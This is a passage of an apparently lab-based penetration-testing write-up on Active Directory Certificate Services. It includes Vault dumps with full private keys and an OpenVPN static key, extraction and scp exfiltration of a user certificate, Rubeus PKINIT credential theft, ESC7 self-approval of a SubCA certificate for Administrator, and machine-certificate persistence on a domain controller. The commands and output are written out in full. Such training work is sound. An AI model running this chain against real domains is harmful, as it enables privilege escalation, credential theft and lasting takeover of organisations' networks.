certificate    -----BEGIN CERTIFICATE-----
MIIEVDCCAzygAwIBAgIBBDANBgkqhkiG9w0BAQsFADBXMQ0wCwYDVQQDEwRBRENT
MQswCQYDVQQGEwJVUzEWMBQGA1UECBMNU2FuIEZyYW5jaXNjbzELMAkGA1UEBxMC
Q0ExFDASBgNVBAoTC0lUIFNlY3VyaXR5MB4XDTIzMDMwNzEwMjMwMVoXDTMzMDMw
NDEwMjMwMVowXTELMAkGA1UEBhMCVVMxFjAUBgNVBAgTDVNhbiBGcmFuY2lzY28x
CzAJBgNVBAcTAkNBMRQwEgYDVQQKEwtJVCBTZWN1cml0eTETMBEGA1UEAxMKaW50
ZXJuYWxjYjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPVsKQVM4/qY
xQCj4RO+TTPslN4wXMXjfuscJ8Bu2lJrT2TcmBxZZUmLVTBUT+ACd6wcjai3j77E
ZnYLzqQHadTYsg+OO5ch+6YvmBIG9gj0E5UubapXXV45DGyPywKBJUVKa7Uv0KCh
c8bGvF6JBV9SzBHr5jA5gbGNIKqffdKN7QksxhLmlBSl+FfM3Ds21W74W1JmVr07
2wFmakiM0tMcFbtl9ec3z9KCD8qdMJU942RD7yv4q0QLNif51I3oGc+ouDePP6G8
/gEYTrzaCgAJtjbUqz2zJOwZpyymkUc2GufoCzb+eT7/glDKhOwnATP10VRM4jjq
f4xXKry/vssCAwEAAaOCASMwggEfMAkGA1UdEwQCMAAwCwYDVR0PBAQDAgXgMDEG
CWCGSAGG+EIBDQQkFiJPcGVuU1NMIEdlbmVyYXRlZCBVc2VyIENlcnRpZmljYXRl
MB0GA1UdDgQWBBSziRUj02/BdgtuI9C8aPT8x8+kuTCBhgYDVR0jBH8wfYAU1KFh
PprUTTPuK/Ze4yMCIkldU9ehW6RZMFcxDTALBgNVBAMTBEFEQ1MxCzAJBgNVBAYT
AlVTMRYwFAYDVQQIEw1TYW4gRnJhbmNpc2NvMQswCQYDVQQHEwJDQTEUMBIGA1UE
ChMLSVQgU2VjdXJpdHmCCAOXS4Uvh+ceMBMGA1UdJQQMMAoGCCsGAQUFBwMCMBUG
A1UdEQQOMAyCCmludGVybmFsY2IwDQYJKoZIhvcNAQELBQADggEBAJUo87jIoa82
K5sPYnkCQwTapigt6xelrieyNp38pAs+je3WLjlSuXYYvCwyVJ+/Rra9+oUxVXsj
6BnEVlI2C3xS9xbVTVL9YMSxEiDK5/EUvNJa21SxUPDgNl+V9ppdnY0oS4IWO3yT
6I4DQeUhHngN/Nz9me+LAhJY1okpoAN6ID7q0kUspWjA3dXGu40x7pFX7d/q59BY
DQTkANEK9S7LAcY5SIBCKusE4MHlynvX3bj8lb+qzu5l6qdm9g8wqO8D6ah5f3wB
blMGXNS1cJoocIzWlThBC4zLtGefD/FyEEdryXogeW8tpsSF0h+Do2orBpfXN3ob
4x/qWyn+aXY=
-----END CERTIFICATE-----
private key    -----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQD1bCkFTOP6mMUA
o+ETvk0z7JTeMFzF437rHCfAbtpSa09k3JgcWWVJi1UwVE/gAnesHI2ot4++xGZ2
C86kB2nU2LIPjjuXIfumL5gSBvYI9BOVLm2qV11eOQxsj8sCgSVFSmu1L9CgoXPG
xrxeiQVfUswR6+YwOYGxjSCqn33Sje0JLMYS5pQUpfhXzNw7NtVu+FtSZla9O9sB
ZmpIjNLTHBW7ZfXnN8/Sgg/KnTCVPeNkQ+8r+KtECzYn+dSN6BnPqLg3jz+hvP4B
GE682goACbY21Ks9syTsGacsppFHNhrn6As2/nk+/4JQyoTsJwEz9dFUTOI46n+M
Vyq8v77LAgMBAAECggEAOaLYE12WYMDF6zuRXVCg0uPppjCXaQXfRZnMIB4oeZio
AZjoxCeeaOIm9H2ocIRD1JC0F/5b7MI1Cd4F/nGbQhhN4OdXSUv6zHF69ijaWQnx
G2TW7l0sGTeumkQ+uezYcuhiWR/MkBy6kuETVeQ59cP9Fuxel865jZgGJuvj4bFr
T4YzwkG/Sly3l8+HSKqNR8WKyUqY+mGSL3hOzxdYdYHczMHqLwg4/N9Vgy05Rg4T
8pdiLADSlL4dwtAWdFaoreDSMevS42/9yeWJ+gqNKwpBDOEjWsfedIpQmeCEN1jT
Ej+gC6TPW/n6Jzit55wDJQxDGnF2wuErKbKm5k99KQKBgQD9NclHvhvXaqG4t4wb
lQpRlyMb3qZ2ieyARvnr0we/It7ik5cCYg+uJsa8zn/vW3MVv5YYBugyKJm/nUVS
xF4MisWIer/sjGBbCmf1yme0JTxtq6+WP5lAU3tI0wsnh/hweCLNF+aI/avRD6Nv
i/6qPWxqgFJ/YAFidd+aWw2xVQKBgQD4IGhyCB8fy6pMKJeorXZAG5UidqMlXHe/
LMBi/b4JPsvGDHflBFfig2ykqVXzFC3NrpqAA6HFJPIcl1lJYJljIwfgvA+hmpyS
CHKTAOicHqQqM9npw7ca5XvnBWAIB6TiQY1Zvpt5FSTRc++xdK8nsNZYB4xBRqgt
Y/J0vPAvnwKBgQCLyibuMZlDSv4vcT2reJOyyaK7Xyc9aBWmGAkf1WiAcCrmoZ6L
1UFc3tF3KPXeWflmN1gQubd1AY8oBxZfhEN73x0ApOvSFwmXGV6dhnnMLYZ38YHF
jCT6K1xzrveIgnt49Aoaeihu1sUFbQHIslwM9k4lWeSxp3n8NqEUoVIk5QKBgQDZ
m3J+L2k8dV2RFTiMkjRW3NnaM7m5FnNeklzXdDmp2gzUUDMGAt0gpqotbuUWHehd
rneJNaY2Q8SiFooTtEhRjXNnQQdkbzhJSmdRTUazRJws9vRx81cum3wii7BA2pNc
aqkQv/2SH1z+5HKeavsCEDCrW1NCHDl6NWF5yAnNeQKBgBQx/dYb4vr3IH8xdgi+
zoMdPVNm1LcBcAb7x7GNXVFNg4SQn5J0SBpYCVyH5XFSwR+CWCluDa2DOqA+9Xqn
3R9oFzoY2ljC/83l3VeTkYwpSVOIn9kSAe9voHK7LtFU3uzxUjxlnw9kEtZ3W3h7
lxzblWmPeqawnFb3bzZLOn+k
-----END PRIVATE KEY-----

root@cb-vault:~# vault kv get "VPN Configs/internalcb_sample_vpn_config"
================ Secret Path ================
VPN Configs/data/internalcb_sample_vpn_config

======= Metadata =======
Key                Value
---                -----
created_time       2023-06-15T12:04:48.418062523Z
custom_metadata    <nil>
deletion_time      n/a
destroyed          false
version            1

===================== Data =====================
Key                                        Value
---                                        -----
Sample .ovpn config for internalcb.corp    #-- Config Auto Generated By pfSense for Viscosity --#

#viscosity startonopen false
#viscosity dhcp true
#viscosity dnssupport true
#viscosity name internalcb.corp
dev tun
persist-tun
persist-key
data-ciphers AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305:AES-256-CBC
data-ciphers-fallback AES-256-CBC
auth SHA256
tls-client
client
resolv-retry infinite
remote 172.16.100.254 443 tcp4
nobind
verify-x509-name "ADCS" name
remote-cert-tls server

<ca>
-----BEGIN CERTIFICATE-----
MIID+TCCAuGgAwIBAgIIA5dLhS+H5x4wDQYJKoZIhvcNAQELBQAwVzENMAsGA1UE
AxMEQURDUzELMAkGA1UEBhMCVVMxFjAUBgNVBAgTDVNhbiBGcmFuY2lzY28xCzAJ
BgNVBAcTAkNBMRQwEgYDVQQKEwtJVCBTZWN1cml0eTAgFw0yMzAxMjYwODM3NDFa
GA8yMTIzMDEwMjA4Mzc0MVowVzENMAsGA1UEAxMEQURDUzELMAkGA1UEBhMCVVMx
FjAUBgNVBAgTDVNhbiBGcmFuY2lzY28xCzAJBgNVBAcTAkNBMRQwEgYDVQQKEwtJ
VCBTZWN1cml0eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANZc6q5T
4k0K2fR5X4RlMBeOfSf4TY2lnBjGDBoqVLDmeuHQ2yWUcq3+VVwySDVqm7WRma+N
fovelaXv3P8X0G1cNogAPnNaCQW2Nwv9JDMk9H1sGlcV+SPAuuKiW0Yew6+ZU8Ci
FlpkOhSRlTd+qk70s55d3Wa2lmhxQGFiVIxoVfzvZzq9MW+7i/1dRlm/MFA7LJg4
lQ+WstgLuyQe2MMNyDPowfWPwTdamZLQb6KdSF/OIWf2yGN311wU6Np+66Paj0OB
BZiYZCFP2tZ+AXx/Yiq3c+B6VzAkZR49mKHyEc6OtHMYcUUXOmiZUQTGbTIqL6It
kgAHg9GNY6n21CMCAwEAAaOBxjCBwzAdBgNVHQ4EFgQU1KFhPprUTTPuK/Ze4yMC
IkldU9cwgYYGA1UdIwR/MH2AFNShYT6a1E0z7iv2XuMjAiJJXVPXoVukWTBXMQ0w
CwYDVQQDEwRBRENTMQswCQYDVQQGEwJVUzEWMBQGA1UECBMNU2FuIEZyYW5jaXNj
bzELMAkGA1UEBxMCQ0ExFDASBgNVBAoTC0lUIFNlY3VyaXR5gggDl0uFL4fnHjAM
BgNVHRMEBTADAQH/MAsGA1UdDwQEAwIBBjANBgkqhkiG9w0BAQsFAAOCAQEAzpdA
krbSnP4dWAdsgo1+8HHv6GxiLTbB+Uypj2vTGJsqM8scCIqSq2fyz9QVHtt8J8Rw
vuOgwntC65OopxHtiq4YSVZco8zTLwjcfBOgNXT5J4W1mtDClC+1CIw9kSisKkMy
0n6E0ghZpMg3bFvTlcVR92Y4jSprN5xPIWN3kx8bFL3ytEXAyYSW7assROJXn6FW
oTqdWU9eYpb1c9fXuiNTSGEhvY0RvSA4mlpLaegd6g2uccRfG087JKClqpC0NZqv
zflPqE3MQRQRFNKnhW1cSDL9WFEy4Oa8edOin/yL/ldui4FIJysxoUMjXgxiuXvm
ogBOuxfkEDFhs8cevA==
-----END CERTIFICATE-----
</ca>
<cert>
..............CERT...............
</cert>
<key>
..........PRIVATE KEY............
</key>
key-direction 1
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
c6712e94ca27a895e197898f03e0c618
8b40e030828a790be72b673829ccd312
e0e910a09726917c3c8a0200436c4c03
b675aa0ff3b567e3fb5b326a7a0633b0
d2069f61236b4ae899b49e963f7e9fd7
70af121e70dbfd44ea0d1ee1caca593c
f72eb11d4f113baf01fa5bec5f8b251a
5f3df2b405714cf9651c5796ac52170e
e2a2c683919d874c2c3a5292b10969db
c51d01876385ebf4bd27f41c1e3f43cf
0f1b6fe5eb677a5888d60ed3934a46a1
b4d94619bbc6197ef945be6fff38f52f
87d3fd5b6f21678add5da183704dc141
5b9d076c9c71e14a26d83b085655deae
3f9a1d5f32202bf18adf2edeec6c20c0
44417e5b5848190d8d1652cc0d512f2f
-----END OpenVPN Static key V1-----
</tls-auth>
root@cb-vault:~# vault kv get "VPN Configs/TLS_Cert_Backup"
========== Secret Path ==========
VPN Configs/data/TLS_Cert_Backup

======= Metadata =======
Key                Value
---                -----
created_time       2023-03-09T09:48:08.726500182Z
custom_metadata    <nil>
deletion_time      n/a
destroyed          false
version            1

======= Data =======
Key            Value
---            -----
certificate    -----BEGIN CERTIFICATE-----
MIIEVDCCAzygAwIBAgIBBDANBgkqhkiG9w0BAQsFADBXMQ0wCwYDVQQDEwRBRENT
MQswCQYDVQQGEwJVUzEWMBQGA1UECBMNU2FuIEZyYW5jaXNjbzELMAkGA1UEBxMC
Q0ExFDASBgNVBAoTC0lUIFNlY3VyaXR5MB4XDTIzMDMwNzEwMjMwMVoXDTMzMDMw
NDEwMjMwMVowXTELMAkGA1UEBhMCVVMxFjAUBgNVBAgTDVNhbiBGcmFuY2lzY28x
CzAJBgNVBAcTAkNBMRQwEgYDVQQKEwtJVCBTZWN1cml0eTETMBEGA1UEAxMKaW50
ZXJuYWxjYjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPVsKQVM4/qY
xQCj4RO+TTPslN4wXMXjfuscJ8Bu2lJrT2TcmBxZZUmLVTBUT+ACd6wcjai3j77E
ZnYLzqQHadTYsg+OO5ch+6YvmBIG9gj0E5UubapXXV45DGyPywKBJUVKa7Uv0KCh
c8bGvF6JBV9SzBHr5jA5gbGNIKqffdKN7QksxhLmlBSl+FfM3Ds21W74W1JmVr07
2wFmakiM0tMcFbtl9ec3z9KCD8qdMJU942RD7yv4q0QLNif51I3oGc+ouDePP6G8
/gEYTrzaCgAJtjbUqz2zJOwZpyymkUc2GufoCzb+eT7/glDKhOwnATP10VRM4jjq
f4xXKry/vssCAwEAAaOCASMwggEfMAkGA1UdEwQCMAAwCwYDVR0PBAQDAgXgMDEG
CWCGSAGG+EIBDQQkFiJPcGVuU1NMIEdlbmVyYXRlZCBVc2VyIENlcnRpZmljYXRl
MB0GA1UdDgQWBBSziRUj02/BdgtuI9C8aPT8x8+kuTCBhgYDVR0jBH8wfYAU1KFh
PprUTTPuK/Ze4yMCIkldU9ehW6RZMFcxDTALBgNVBAMTBEFEQ1MxCzAJBgNVBAYT
AlVTMRYwFAYDVQQIEw1TYW4gRnJhbmNpc2NvMQswCQYDVQQHEwJDQTEUMBIGA1UE
ChMLSVQgU2VjdXJpdHmCCAOXS4Uvh+ceMBMGA1UdJQQMMAoGCCsGAQUFBwMCMBUG
A1UdEQQOMAyCCmludGVybmFsY2IwDQYJKoZIhvcNAQELBQADggEBAJUo87jIoa82
K5sPYnkCQwTapigt6xelrieyNp38pAs+je3WLjlSuXYYvCwyVJ+/Rra9+oUxVXsj
6BnEVlI2C3xS9xbVTVL9YMSxEiDK5/EUvNJa21SxUPDgNl+V9ppdnY0oS4IWO3yT
6I4DQeUhHngN/Nz9me+LAhJY1okpoAN6ID7q0kUspWjA3dXGu40x7pFX7d/q59BY
DQTkANEK9S7LAcY5SIBCKusE4MHlynvX3bj8lb+qzu5l6qdm9g8wqO8D6ah5f3wB
blMGXNS1cJoocIzWlThBC4zLtGefD/FyEEdryXogeW8tpsSF0h+Do2orBpfXN3ob
4x/qWyn+aXY=
-----END CERTIFICATE-----
private key    -----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQD1bCkFTOP6mMUA
o+ETvk0z7JTeMFzF437rHCfAbtpSa09k3JgcWWVJi1UwVE/gAnesHI2ot4++xGZ2
C86kB2nU2LIPjjuXIfumL5gSBvYI9BOVLm2qV11eOQxsj8sCgSVFSmu1L9CgoXPG
xrxeiQVfUswR6+YwOYGxjSCqn33Sje0JLMYS5pQUpfhXzNw7NtVu+FtSZla9O9sB
ZmpIjNLTHBW7ZfXnN8/Sgg/KnTCVPeNkQ+8r+KtECzYn+dSN6BnPqLg3jz+hvP4B
GE682goACbY21Ks9syTsGacsppFHNhrn6As2/nk+/4JQyoTsJwEz9dFUTOI46n+M
Vyq8v77LAgMBAAECggEAOaLYE12WYMDF6zuRXVCg0uPppjCXaQXfRZnMIB4oeZio
AZjoxCeeaOIm9H2ocIRD1JC0F/5b7MI1Cd4F/nGbQhhN4OdXSUv6zHF69ijaWQnx
G2TW7l0sGTeumkQ+uezYcuhiWR/MkBy6kuETVeQ59cP9Fuxel865jZgGJuvj4bFr
T4YzwkG/Sly3l8+HSKqNR8WKyUqY+mGSL3hOzxdYdYHczMHqLwg4/N9Vgy05Rg4T
8pdiLADSlL4dwtAWdFaoreDSMevS42/9yeWJ+gqNKwpBDOEjWsfedIpQmeCEN1jT
Ej+gC6TPW/n6Jzit55wDJQxDGnF2wuErKbKm5k99KQKBgQD9NclHvhvXaqG4t4wb
lQpRlyMb3qZ2ieyARvnr0we/It7ik5cCYg+uJsa8zn/vW3MVv5YYBugyKJm/nUVS
xF4MisWIer/sjGBbCmf1yme0JTxtq6+WP5lAU3tI0wsnh/hweCLNF+aI/avRD6Nv
i/6qPWxqgFJ/YAFidd+aWw2xVQKBgQD4IGhyCB8fy6pMKJeorXZAG5UidqMlXHe/
LMBi/b4JPsvGDHflBFfig2ykqVXzFC3NrpqAA6HFJPIcl1lJYJljIwfgvA+hmpyS
CHKTAOicHqQqM9npw7ca5XvnBWAIB6TiQY1Zvpt5FSTRc++xdK8nsNZYB4xBRqgt
Y/J0vPAvnwKBgQCLyibuMZlDSv4vcT2reJOyyaK7Xyc9aBWmGAkf1WiAcCrmoZ6L
1UFc3tF3KPXeWflmN1gQubd1AY8oBxZfhEN73x0ApOvSFwmXGV6dhnnMLYZ38YHF
jCT6K1xzrveIgnt49Aoaeihu1sUFbQHIslwM9k4lWeSxp3n8NqEUoVIk5QKBgQDZ
m3J+L2k8dV2RFTiMkjRW3NnaM7m5FnNeklzXdDmp2gzUUDMGAt0gpqotbuUWHehd
rneJNaY2Q8SiFooTtEhRjXNnQQdkbzhJSmdRTUazRJws9vRx81cum3wii7BA2pNc
aqkQv/2SH1z+5HKeavsCEDCrW1NCHDl6NWF5yAnNeQKBgBQx/dYb4vr3IH8xdgi+
zoMdPVNm1LcBcAb7x7GNXVFNg4SQn5J0SBpYCVyH5XFSwR+CWCluDa2DOqA+9Xqn
3R9oFzoY2ljC/83l3VeTkYwpSVOIn9kSAe9voHK7LtFU3uzxUjxlnw9kEtZ3W3h7
lxzblWmPeqawnFb3bzZLOn+k
-----END PRIVATE KEY-----
```

-> We have yet another VPN file with missing entries, as well as a backup file containing those missing entries. We can now form the full VPN file.

- Let's inspect the `.db` files now.
```bash
root@cb-vault:~/.pki/internal_nssdb# file cert9.db
cert9.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 4, database pages 7, cookie 0x5, schema 4, UTF-8, version-valid-for 4
root@cb-vault:~/.pki/internal_nssdb# file key4.db
key4.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 8, database pages 9, cookie 0x6, schema 4, UTF-8, version-valid-for 8
```

- It seems that these are SQLite databases that, by their names, are related to certificate stores. Let's see if we can extract a certificate.
```bash
root@cb-vault:~/.pki/internal_nssdb# certutil -d . -L

Certificate Nickname                                         Trust Attributes
                                                             SSL,S/MIME,JAR/XPI

internaluser - corp                                          u,u,u
```

- This shows that we can extract a certificate for `internaluser`. Let's try to dump it.
```bash
root@cb-vault:~/.pki/internal_nssdb# certutil -d . -L -a -n "internaluser - corp"
-----BEGIN CERTIFICATE-----
MIIGADCCBOigAwIBAgITMAAAAC6sa0prGoGx1AAAAAAALjANBgkqhkiG9w0BAQsF
ADA6MRQwEgYKCZImiZPyLGQBGRYEY29ycDESMBAGCgmSJomT8ixkARkWAmNiMQ4w
DAYDVQQDEwVDQi1DQTAeFw0yMzA0MjEwNzE0MTVaFw0yNDA0MjAwNzE0MTVaMFkx
FDASBgoJkiaJk/IsZAEZFgRjb3JwMRowGAYKCZImiZPyLGQBGRYKaW50ZXJuYWxj
YjEOMAwGA1UEAxMFVXNlcnMxFTATBgNVBAMTDGludGVybmFsdXNlcjCCASIwDQYJ
KoZIhvcNAQEBBQADggEPADCCAQoCggEBAJjpYvG5f73kQNdx/5/OU+pF+bYzfQzz
ogDjCVn3FeOLi+ZX3ja6bkvhyXyp3mW7HsgSLa1nSqFBPjhiwcriXe70yhjWfUim
y3/hC9SCU9Mk1ILuMsRs2sS+slANnItMypdyvi9d+kqaqHkZ4ch/Giiz+4I1chda
dBSZ7tCEGAU3BPqSbTZus/qIA/heNoWe3DVpPX2j1lbmbz/yFEuKvzWjxiM27LDG
UGk8+HXp1IvMUngCWYg7Xj0dfRYUYzQt3x4MUwVSXVbH4sJYYBU1EfJW6Vw/FHKN
0b/65cFUfsK4tRDiIXSkcNO9PDy4D4Moi3ABGgMYZeEdw2bCeUgelvECAwEAAaOC
At4wggLaMBcGCSsGAQQBgjcUAgQKHggAVQBzAGUAcjApBgNVHSUEIjAgBgorBgEE
AYI3CgMEBggrBgEFBQcDBAYIKwYBBQUHAwIwDgYDVR0PAQH/BAQDAgWgMEQGCSqG
SIb3DQEJDwQ3MDUwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAHBgUr
DgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUu1BdHnGBgSwFSSwILihpByXvjaYw
HwYDVR0jBBgwFoAUH4pPh7DadO1HH3IkdoDLhWAwoIIwgb0GA1UdHwSBtTCBsjCB
r6CBrKCBqYaBpmxkYXA6Ly8vQ049Q0ItQ0EsQ049Y2ItY2EsQ049Q0RQLENOPVB1
YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRp
b24sREM9Y2IsREM9Y29ycD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/
b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbMGCCsGAQUFBwEBBIGm
MIGjMIGgBggrBgEFBQcwAoaBk2xkYXA6Ly8vQ049Q0ItQ0EsQ049QUlBLENOPVB1
YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRp
b24sREM9Y2IsREM9Y29ycD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9
Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA3BgNVHREEMDAuoCwGCisGAQQBgjcUAgOg
HgwcaW50ZXJuYWx1c2VyQGludGVybmFsY2IuY29ycDBPBgkrBgEEAYI3GQIEQjBA
oD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMjE3Nzg1NDA0OS00MjA0MjkyNjY2
LTE0NjMzMzgyMDQtMTEwNDANBgkqhkiG9w0BAQsFAAOCAQEAdp9zQFf23IAfjbqN
qQO0iJzt93YOCUvgpR2ihzdb/6JSBV90TG6IN8XhEl4Kyx0DOcRqXsyLPtx03k4r
jHZkKF9keUUE4PAzCPZXixJppWHw910mEkHcYY/tBRZ8O0+UURwVFCHgAKSmHbnw
Hg425sRHsOziqLIKPr5FYnoLVygjgy2HTcucQD4iYJh5uWLSNgZ8tU5UtjL2MpG7
rAETvjlArV5eckv4dhZtDlRWK00aaIajwTAgC9EMjGHzaFr79pPYVdOQXkJnwQ+S
tf2/NYLeBQPWNb7oyYdADcb4jBEyWCXBglgMdww6wV9ravjeGzd0uRofwEiDvqjM
pH3K1g==
-----END CERTIFICATE-----
```

- Let's also try to enumerate for private keys in this directory.
```bash
root@cb-vault:~/.pki/internal_nssdb# certutil -d . -K
certutil: Checking token "NSS Certificate DB" in slot "NSS User Private Key and Certificate Services"
< 0> rsa      babdc0c2b2abd34dfcbe9df3f04ce47a70d6ebf5   internaluser - corp
```

- There is also a Private Key.
- Let's try to use both and combine them to a `.p12` certificate.
```bash
root@cb-vault:~/.pki/internal_nssdb# pk12util -o /tmp/internaluser.p12 -n "internaluser - corp" -d /tmp/.pki/internal_nssdb
Enter password for PKCS12 file:
Re-enter password:
pk12util: PKCS12 EXPORT SUCCESSFUL
```

- Now let's change it's permissions to exfiltrate it via `scp`.
```bash
root@cb-vault:~/.pki/internal_nssdb# chmod 777 /tmp/internaluser.p12
```

```bash
PS C:\ADCS\Auditor> scp.exe -i .\id_rsa -i .\id_rsa_signed.pub studentadmin@cb-vault.certbulk.cb.corp:/tmp/internaluser.p12 C:\ADCS\Auditor\Loot\internaluser.p12
```

## `internalcb.corp` ##

### Escalate privileges to DA/EA ###
- We have a certificate for `internalcb\internaluser` as well as a VPN file to connect to `internalcb.corp`.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:internaluser /certificate:C:\ADCS\Auditor\Loot\internaluser.p12 /domain:internalcb.corp /dc:cbi-dc.internalcb.corp /nowrap /ptt /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=internaluser, CN=Users, DC=internalcb, DC=corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'internalcb.corp\internaluser'
[*] Using domain controller: 172.135.203.1:88

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 6CA67841F08C8C73BAF4D93CA16E7760
```

- We will now start enumerating the domain in [[1. Enumeration]].
- `internalcb\internaluser` has `Allow`,  `ManageCA`, `ManageCertificates` and `Enroll` permissions in the CA.
- We can abuse these excessive permissions to approve certificate requests using [[ESC7]].
- The **SubCA** is a good candidate for that abuse, since it has the `ENROLLEE_SUPPLIES_SUBJECT` flag set, which means that we can request a certificate on behalf of any domain/enterprise user we want.
- Let's request a certificate for the DA/EA, `internalcb\administrator`.
- First, we need to find the SID of the user to bypass the CBA patch.
```powershell
PS C:\ADCS\Auditor> Get-DomainUser -Domain internalcb.corp | Select-Object samaccountname,objectsid

samaccountname objectsid
-------------- ---------
Administrator  S-1-5-21-2177854049-4204292666-1463338204-500

<snip>
```

- Now, let's request the certificate for the DA/EA of `internalcb.corp` domain.
```powershell
PS C:\ADCS\Auditor> .\Certify.exe request /ca:cb-ca.cb.corp\CB-CA /domain:internalcb.corp /template:SubCA /altname:Administrator /sidextension:S-1-5-21-2177854049-4204292666-1463338204-500

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : CERTBULK\student33
[*] No subject name specified, using current context as subject.

[*] Template                : SubCA
[*] Subject                 : CN=student33, CN=Users, DC=certbulk, DC=cb, DC=corp
[*] AltName                 : Administrator
[*] SidExtension            : S-1-5-21-2177854049-4204292666-1463338204-500

[*] Certificate Authority   : cb-ca.cb.corp\CB-CA

[!] CA Response             : The submission failed: Denied by Policy Module
[!] Last status             : 0x80094012
[*] Request ID              : 61

[*] cert.pem         :

<snip>

[X] Error downloading certificate: Cert not yet issued yet! (iDisposition: 2)

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

-> Obviously, the request has failed, since `internalcb\internaluser` has no Enrollment Rights for this specific template.

- Since we have `ManageCertificates` permissions, we can approve this requested certificate.
```powershell
PS C:\ADCS\Auditor> .\Certify-esc7.exe issue /ca:CB-CA.CB.CORP\CB-CA /id:61

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Issue a pending for approval certificate.
[*] Certificates Authority   : CB-CA.CB.CORP\CB-CA
[*] Request ID              : 61

[*] Certificate issued!


Certify completed in 00:00:08.4502823
```

- We can now retrieve the approved certificate.
```powershell
PS C:\ADCS\Auditor> .\Certify-esc7.exe download /ca:CB-CA.CB.CORP\CB-CA /id:61

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Download a Certificates
[*] Certificates Authority   : CB-CA.CB.CORP\CB-CA
[*] Request ID              : 61

[*] cert.pem         :

<snip>
```

- We can now combine the PRIVATE KEY and the CERTIFICATE entries to form the complete `.pem` file. We will then convert it to a `.pfx` format and use it to request a TGT for `internalcb\administrator`.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:administrator /certificate:C:\ADCS\Auditor\Loot\internalcb_da.pfx /domain:internalcb.corp /dc:cbi-dc.internalcb.corp /nowrap /ptt /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=student33, CN=Users, DC=certbulk, DC=cb, DC=corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'internalcb.corp\administrator'
[*] Using domain controller: 172.135.203.1:88

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A6080B9F11109586E9F51EFA7E6304BD
```

- We can now access **CBI-DC**.
```powershell
PS C:\ADCS\Auditor> winrs -r:cbi-dc.internalcb.corp powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator> hostname;whoami
hostname;whoami
cbi-dc
internalcb\administrator
```

- We will request a machine certificate for long-term persistence on the DC.
```powershell
PS C:\Users\Administrator> .\CertifyKit.exe request /ca:cb-ca.cb.corp\cb-ca /machine /template:DomainController
.\CertifyKit.exe request /ca:cb-ca.cb.corp\cb-ca /machine /template:DomainController
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: Request a Certificates
[*] Elevating to SYSTEM context for machine cert request

[*] Current user context    : NT AUTHORITY\SYSTEM
[*] No subject name specified, using current machine as subject

[*] Template                : DomainController
[*] Subject                 : CN=cbi-dc.internalcb.corp

[*] Certificate Authority   : cb-ca.cb.corp\cb-ca

<snip>
```

### Compromise the RootCA ###
- As we saw from [[1. Enumeration]], there is no standalone CA for `internalcb.corp`. **CB-CA** is used for this domain.
